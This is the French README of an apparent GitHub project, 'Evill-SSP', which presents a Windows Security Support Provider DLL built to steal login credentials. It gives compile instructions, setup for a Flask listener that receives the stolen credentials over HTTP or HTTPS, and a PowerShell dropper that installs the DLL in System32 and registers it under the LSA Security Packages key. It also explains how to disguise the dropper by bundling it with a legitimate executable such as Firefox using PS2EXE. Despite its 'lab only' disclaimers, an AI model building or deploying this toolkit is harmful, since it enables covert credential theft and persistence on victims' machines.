# Evill-SSP
ssp dll to steal windows credentials

---

## Description

Ce projet documente le développement, la compilation et l'utilisation d'une **DLL SSP (Security Support Provider)** sur Windows, capable d'intercepter des identifiants de connexion système, puis de les transmettre à un serveur web distant via HTTP ou HTTPS.

⚠️ **Ce projet est strictement à des fins de recherche en cybersécurité, de compréhension de l’architecture SSP Windows et de démonstration dans un environnement de LAB isolé.**  
**Toute utilisation en dehors d’un cadre légal et contrôlé est interdite.**

---

## Fonctionnalités

- Interception de credentials au moment de l'authentification système
- Exfiltration des identifiants vers un serveur distant en HTTP/HTTPS
- Intégration dans un processus légitime via un dropper PowerShell
- Configuration automatisée de la clé de registre Windows pour activer la DLL SSP

---

## Fichiers

```
.
├── evildll.cpp            # Code source de la DLL SSP
├── srv-creds-http.py      # Serveur web d'écoute HTTP (Flask)
├── srv-creds-https.py     # Serveur web d'écoute HTTPS (Flask)
├── dlltoexe.ps1           # Script PowerShell pour dropper la DLL et modifier la clé LSA
├── cert.pem / key.pem     # Certificat SSL/TLS pour le serveur HTTPS (À générer, non fournis.)
└── README.md              # Documentation complète du projet
```

---

## Compilation de la DLL

### Création d’un projet Visual Studio

1. Créer un nouveau projet :
   - **Type** : Dynamic Link Library (DLL)
   - **Nom** : `evildll`
2. Remplacer le contenu de `dllmain.cpp` par celui de `evildll.cpp`.
3. Modifier la ligne 55 en ajoutant l'ip de server de destination ainsi que le port.
4. Propriétés du projet :
   - **C/C++ > Général > Répertoires Include** : Ajouter le chemin du Windows SDK.
   - **C/C++ > En-têtes précompilés** : *Ne pas utiliser*.
5. Configuration : `Release x64`.
6. Générer la DLL.

---

## Serveur Web d'Écoute

### Mode HTTP (port 80)

```bash
python3 srv-creds-http.py
```

### Mode HTTPS (port 443)

```bash
python3 srv-creds-https.py --cert cert.pem --key key.pem
```

#### Génération du certificat auto-signé

```bash
openssl genrsa -out key.pem 2048
openssl req -new -key key.pem -out csr.pem
openssl x509 -req -days 365 -in csr.pem -signkey key.pem -out cert.pem
```

---

## Déploiement de la DLL via PowerShell

Le script `dlltoexe.ps1` :

* Lance un exécutable légitime (ex: Firefox).
* Copie la DLL dans `C:\Windows\System32`.
* Modifie la clé de registre `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`.

⚠️ Exécution requise en **mode administrateur**.

### modification dans le script :

```powershell
# Modifier les chemins source/target de l'exe et de la dll
Start-Process "C:\chemin\vers\mon_programme.exe"
Copy-Item "C:\chemin\vers\evildll.dll" -Destination "C:\Windows\System32"
```

---

## Création d’un exécutable unique avec PS2EXE
### Prérequis
- un exe légitime comme firefox ou autre
- la dll générer

Modifier le code source du script powershell pour modifier l'emplacement de l'executable et de la dll.

### PS2EXE
1. Installer le module PS2EXE :

```powershell
Install-Module -Name PS2EXE
Import-Module ps2exe
```

2. Emballer le script et un exécutable légitime dans un binaire autonome :

```powershell
Invoke-PS2EXE .\dlltoexe.ps1 .\build_firefox.exe
```

---

## Endpoint API

| Endpoint               | Méthode | Description                           |
| ---------------------- | ------- | ------------------------------------- |
| `/receive_credentials` | POST    | Réception des credentials interceptés |
| `/health`              | GET     | Vérifie si le serveur est actif       |

---

## ⚖️ Avertissement légal

> Ce code est à **usage strictement pédagogique** et ne doit **jamais être utilisé à des fins malveillantes**.
> L'auteur **ne pourra en aucun cas être tenu responsable** de l’utilisation frauduleuse, illégale ou non autorisée de ce code.
> Vous êtes **seul responsable** de vous conformer aux lois en vigueur dans votre pays concernant la sécurité informatique, l'espionnage électronique et la protection des systèmes informatiques.
> L'utilisation sur un système sans consentement explicite et documenté constitue une **infraction pénale**.
> L'auteur décline toute responsabilité en cas d’usage abusif.

---

## Références

* [Microsoft SSP Architecture](https://learn.microsoft.com/en-us/windows/win32/secauthn/security-support-provider)
* [WinHTTP API](https://learn.microsoft.com/en-us/windows/win32/api/winhttp/)
* [Flask](https://flask.palletsprojects.com/)
* [PS2EXE GitHub](https://github.com/MScholtes/PS2EXE)
